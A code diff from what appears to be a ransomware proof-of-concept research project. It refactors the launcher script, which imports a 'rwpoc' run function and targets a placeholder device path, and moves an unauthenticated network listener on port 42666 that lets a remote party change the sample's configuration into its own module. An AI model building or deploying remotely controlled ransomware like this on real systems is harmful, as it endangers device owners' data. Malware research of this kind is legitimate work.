@@ -1,13 +1,12 @@
 from os import path, remove
-from json import loads
 from multiprocessing import Process
-from socket import AF_INET, SOCK_STREAM, socket
 from subprocess import call
 from time import sleep
 from argparse import ArgumentParser
 
-from globals import get_config_path, update_existing_config
+from globals import get_config_path
 from rwpoc import run
+from config_changes import listen_for_config_changes
 
 TARGET_PATH = "<start-path-on-target-device>"
 
@@ -33,23 +32,6 @@ def execute_installation_behavior():
 
 def execute_preprocessing_behavior():
     call("./benign_behaviors/preprocessing.sh")
-
-
-def listen_for_config_changes():
-    with socket(AF_INET, SOCK_STREAM) as sock:
-        sock.bind(("0.0.0.0", 42666))
-        sock.listen(1)
-
-        while True:
-            conn, addr = sock.accept()  # keep listening for new connections
-            with conn:
-                while True:
-                    data = conn.recv(1024)  # listen for incoming data of connection
-                    if not data:
-                        break
-                    new_config = loads(data.decode(encoding="utf-8"))
-                    print("received", new_config)
-                    update_existing_config(new_config)
 
 
 def collect_device_fingerprint():
